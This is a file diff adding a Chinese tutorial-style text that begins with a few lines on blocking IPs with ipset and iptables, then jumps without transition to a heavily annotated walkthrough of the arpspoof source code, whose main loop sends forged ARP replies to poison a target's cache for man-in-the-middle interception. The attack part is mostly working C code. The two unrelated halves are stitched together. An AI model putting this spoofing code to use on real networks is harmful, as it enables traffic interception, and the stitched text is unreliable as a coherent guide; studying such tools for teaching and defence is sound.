@@ -1,0 +1,291 @@
+iptables 包含几个表，每个表由链组成。默认的是 filter 表，最常用的也是 filter 表，另一个比较常用的是 nat 表。一般封 IP 就是在 filter 表的 INPUT 链添加规则。
+
+在进行规则匹配时，是从规则列表中从头到尾一条一条进行匹配。
+
+可以用这几条命令概括使用 ipset 和 iptables 进行 IP 封禁的流程
+
+ipset create vader hash:ip  
+iptables -I INPUT -m set --match-set vader src -j DROP  
+ipset add vader 4.5.6.7  
+ipset add vader 1.2.3.4  
+ipset add vader ...  
+ipset list vader # 查看 vader 集合的内容  
+
+下面分别对各条命令进行描述。
+
+###哎，技术太菜，需要好好学习了！！！
+
+---
+---
+代码理解：
+
+从main函数开始
+
+首先大家不要慌，我加了无数注释，这个工具的代码也不过400行而已。首先我们看一下main函数：
+
+为了避免大家看起来太紧张，我在源码的注释中加了详细的讲解，方便基础薄弱的同学理解：
+
+int main(int argc, char *argv[])
+{
+       int c;
+       char ebuf[PCAP_ERRBUF_SIZE];
+       intf = NULL;
+       spoof_ip = target_ip = 0;
+ 
+ /**
+      关于getopt这个函数我想做如下解释大家就可以读懂下面的函数的具体意思了：
+      1.getopt的用途：用于专门处理函数参数的。
+      2.getopt的用法：argc与argv直接是从main的参数中拿下来的，第三个参数描述了整个程序参数的命令要求
+                    具体的用法我们可以先理解为要求i,t这两个参数必须有值
+                    然后有具体值得参数会把值付给全局变量optarg，这样我们就能理解下面的while循环中的操作了
+ */
+       while ((c = getopt(argc, argv, "i:t:h?V")) != -1) {
+ 
+              switch (c) {
+ 
+              case 'i':
+                     intf = optarg;
+                     break;
+              case 't':
+/*
+       libnet_name_resolve是解析域名,然后把域名解析的结果形成ip地址返回到target_ip
+*/
+                     if ((target_ip = libnet_name_resolve(optarg, 1)) == -1)
+                            usage();
+                     break;
+              default:
+                     usage();
+ 
+              }
+ 
+       }
+      
+       argc -= optind;
+       argv += optind;
+ 
+       if (argc != 1)
+              usage();
+ 
+       if ((spoof_ip = libnet_name_resolve(argv[0], 1)) == -1)
+              usage();
+ 
+      /*
+      pcap_lookupdev 顾名思义这个pcap库中的函数是用来寻找本机的可用网络设备。
+      下面的if语句是将如果intf（-i的参数为空就调用pcap_lookupdev来寻找本机的网络设备）      
+      ebuf就是error_buf用来存储错误信息
+      */
+       if (intf == NULL && (intf = pcap_lookupdev(ebuf)) == NULL)
+              errx(1, "%s", ebuf);
+ 
+ /*
+ libnet_open_link_interface这个函数存在于libnet库中，作用是打开intf指向的网络链路设备
+ 错误信息存入ebuf中。
+ */
+       if ((llif = libnet_open_link_interface(intf, ebuf)) == 0)
+              errx(1, "%s", ebuf);
+ 
+ /*
+ 下面语句的意思是如果target_ip为0或者是arp_find没有成功找到target_ip
+ 那么提示错误
+ */
+       if (target_ip != 0 && !arp_find(target_ip, &target_mac))
+              errx(1, "couldn't arp for host %s",
+     libnet_host_lookup(target_ip, 0));
+ 
+ //这里关于信号的处理问题如果大家不是太清楚的话也可以跳过，
+ //有兴趣的朋友，可以深入了解一下，因为这里不是本文重点，就不再赘述了
+       signal(SIGHUP, cleanup);
+       signal(SIGINT, cleanup);
+       signal(SIGTERM, cleanup);
+ 
+       for (;;) {
+             /*
+                    在这个for的循环里我们看到了我们希望看到的核心模块
+      arp_send大家一看这个函数便知道这个函数是用来发送伪造的arp数据包的，关于这个函数具体的用法我们稍后将会讨论
+              */   
+              arp_send(llif, intf, ARPOP_REPLY, NULL, spoof_ip,
+                    (target_ip ? (u_char *)&target_mac : NULL),
+                    target_ip);
+              sleep(2);
+ 
+       }
+/* NOTREACHED */
+ 
+       exit(0);
+ 
+}
+
+看了main函数里面的各种东西，我们发现并没有什么玄机，其实就是很简单的编程，具体的函数讲解都在注释中写出来了。
+
+核心函数的登场 
+
+接下来我们就看一下他是如何实现发送arp包的，其实知道大家看了源代码以后就知道，这真的没有什么技术含量，
+
+/**
+      这里是我们发送arp包的核心实现
+      我先来介绍一下这个函数的参数方便大家理解
+      参数一：libnet链路层接口，通过这个接口可以操作链路层
+      参数二：本机的网卡设备intf（由-i指定或者pcap_lookupdev来获取）
+      参数三：arpop，来指定arp包的操作
+      参数四：本机硬件地址
+      参数五：本机ip
+      参数六：目标硬件地址
+      参数七：目标ip
+ */
+int arp_send(struct libnet_link_int *llif, char *dev,
+ int op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)
+{
+ 
+       char ebuf[128];
+       u_char pkt[60];
+ 
+ /*
+ 这里来通过链路层和网卡来获取dev对应的mac地址*/
+       if (sha == NULL &&
+    (sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) {
+ 
+              return (-1);
+ 
+       }
+       /*
+       这里通过链路层和网卡来获取dev对应的ip地址
+       */
+ 
+       if (spa == 0) {
+ 
+              if ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)
+                     return (-1);
+              spa = htonl(spa); /* XXX */
+ 
+       }
+      
+       /*
+       如果目标mac没有的话就被赋值为\xff\xff\xff\xff\xff\xff
+       */
+       if (tha == NULL)
+              tha = "\xff\xff\xff\xff\xff\xff";
+ 
+ /*
+libnet_ptag_t libnet_build_ethernet(
+u_int8_t*dst, u_int8_t *src,
+u_int16_ttype, u_int8_t*payload,
+u_int32_tpayload_s, libnet_t*l,
+libnet_ptag_t ptag )
+功能：
+构造一个以太网数据包
+参数：
+dst：目的 mac
+src：源 mac
+type：上层协议类型
+payload：负载，即附带的数据，可设置为 NULL（这里通常写 NULL）
+payload_s：负载长度，或为 0（这里通常写 0 ）
+l：libnet 句柄，libnet_init() 返回的 libnet * 指针
+ptag：协议标记，第一次组新的发送包时，这里写 0，同一个应用程序，下一次再组包时，这个位置的值写此函数的返回值。
+返回值：
+成功：协议标记
+失败：-1
+ */
+       libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt);
+ /*
+ libnet_ptag_t libnet_build_arp(
+u_int16_t hrd, u_int16_t pro,
+u_int8_t hln, u_int8_t pln，
+u_int16_t op, u_int8_t *sha,
+u_int8_t *spa, u_int8_t *tha，
+u_int8_t *tpa, u_int8_t *payload，
+u_int32_t payload_s, libnet_t *l,
+libnet_ptag_t ptag )
+功能：
+构造 arp 数据包 
+参数： 
+hrd：硬件地址格式，ARPHRD_ETHER（以太网） 
+pro：协议地址格式，ETHERTYPE_IP（ IP协议） 
+hln：硬件地址长度 
+pln：协议地址长度 
+op：ARP协议操作类型（1：ARP请求，2：ARP回应，3：RARP请求，4：RARP回应） 
+sha：发送者硬件地址 
+spa：发送者协议地址 
+tha：目标硬件地址 
+tpa：目标协议地址 
+payload：负载，可设置为 NULL（这里通常写 NULL） 
+payload_s：负载长度，或为 0（这里通常写 0 ） 
+l：libnet 句柄，libnet_init() 返回的 libnet * 指针 
+ptag：协议标记，第一次组新的发送包时，这里写 0，同一个应用程序，下一次再组包时，这个位置的值写此函数的返回值。 
+返回值： 
+成功：协议标记 
+失败：-1
+ */
+       libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,
+             op, sha, (u_char *)&spa, tha, (u_char *)&tpa,
+             NULL, 0, pkt + ETH_H);
+ 
+       fprintf(stderr, "%s ",
+       ether_ntoa((struct ether_addr *)sha));
+ 
+ 
+ 
+ /*
+ 下面的if和else是回显处理（也就是大家能看到的部分
+ */
+       if (op == ARPOP_REQUEST) {
+ 
+              fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
+                     ether_ntoa((struct ether_addr *)tha),
+                     libnet_host_lookup(tpa, 0),
+                     libnet_host_lookup(spa, 0));
+ 
+       }
+       else {
+ 
+              fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
+                     ether_ntoa((struct ether_addr *)tha),
+                     libnet_host_lookup(spa, 0));
+              fprintf(stderr, "%s\n",
+                     ether_ntoa((struct ether_addr *)sha));
+ 
+       }
+       return (libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt));
+ 
+}
+
+我们看到这其实真的没有什么很神奇的内容对吧？
+
+小尾巴
+
+ /*
+      下面我们发现挂载信号处理函数的都是cleanup函数，
+      这个函数很好理解，就是在本机网络设备存在的条件下把包再发三遍，
+     
+      但是为什么要这么做呢？似乎立即中断也没什么不合理，
+      我想作者的意思就是总要给一个缓冲的时间啊
+ 
+      我们再仔细观察一下，在main的主循环中是sleep(2)
+      在下面的循环中是sleep(1)
+     
+ */
+void cleanup(int sig)
+{
+ 
+       int i;
+ 
+       if (arp_find(spoof_ip, &spoof_mac)) {
+ 
+              for (i = 0; i < 3; i++) {
+ 
+/* XXX - on BSD, requires ETHERSPOOF kernel. */
+ 
+/*上面这条注释是源码的作者加的，意思是说在BSD系统中需要ETHERSPOOF的第三方内核模块*/
+                     arp_send(llif, intf, ARPOP_REPLY,
+                           (u_char *)&spoof_mac, spoof_ip,
+                           (target_ip ? (u_char *)&target_mac : NULL),
+                           target_ip);
+                     sleep(1);
+ 
+              }
+ 
+       }     
+       exit(0);
+ 
+}
+
+这样我们还有什么不理解么？在《中间人攻击-ARP毒化》一文中，arpspoof这个工具被我们以这样的方式解密，大家是否开始觉得其实这并没有任何神奇的地方？这就是我们神化的黑客工具吧。 
